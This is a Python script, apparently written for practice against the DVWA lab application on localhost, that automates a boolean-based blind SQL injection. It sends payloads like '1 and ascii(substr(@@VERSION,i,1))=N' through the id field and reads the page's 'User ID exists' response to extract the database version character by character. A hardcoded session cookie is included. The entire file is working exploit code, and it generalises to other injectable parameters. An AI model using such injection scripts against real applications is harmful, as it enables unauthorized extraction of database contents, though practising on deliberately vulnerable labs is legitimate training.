import requests
from bs4 import BeautifulSoup

LIMIT = 100
PHPSESSID = "kri9p6qnk4df06cejgkpq421o0"
SECURITY = "medium"
HEADER = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"}

def get_db_version_len():
    version_len = 0
    while True:
        version_len += 1
        url = f"http://localhost/vulnerabilities/sqli_blind/"
        
        # burp_proxy = {"http": "http://127.0.0.1:8080",
        #               "https": "https://127.0.0.1:8080"
        #               }
        burp_data = {"id": f"1 and length(@@VERSION)={version_len}",
                     "Submit": "Submit"}
        
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY}
        # response = requests.post(url, data=burp_data, cookies=cookies, headers=header, proxies=burp_proxy)
        response = requests.post(url, data=burp_data, cookies=cookies, headers=HEADER)
        
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return version_len
        if version_len >= 100:
            raise ValueError(f'Tried {version_len} time but table len not found')   
        
def get_db_ver_char_ascii(digit):
    target_ascii = 0
    while True:
        target_ascii += 1
        url = f"http://localhost/vulnerabilities/sqli_blind/"
        header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "close",
                "Upgrade-Insecure-Requests": "1"}
        
        # burp_proxy = {"http": "http://127.0.0.1:8080",
        #               "https": "https://127.0.0.1:8080"
        #               }
        
        burp_data = {"id": f"1 and ascii(substr(@@VERSION,{digit},1))={target_ascii}",
                     "Submit": "Submit"}
        
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY}
        # response = requests.post(url, data=burp_data, cookies=cookies, headers=HEADER, proxies=burp_proxy)
        response = requests.post(url, data=burp_data, cookies=cookies, headers=HEADER)
        
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return chr(target_ascii)
        if target_ascii > 127:
            raise ValueError(f'char not found on {digit}')

def get_db_ver(name_len):
    table_name = ""
    for idx in range(1, name_len + 1):
        table_name += get_db_ver_char_ascii(idx)
    return table_name

if __name__ == "__main__":
    db_version_len = get_db_version_len()
    print(db_version_len)
    db_version = get_db_ver(db_version_len)
    print(db_version)
    
    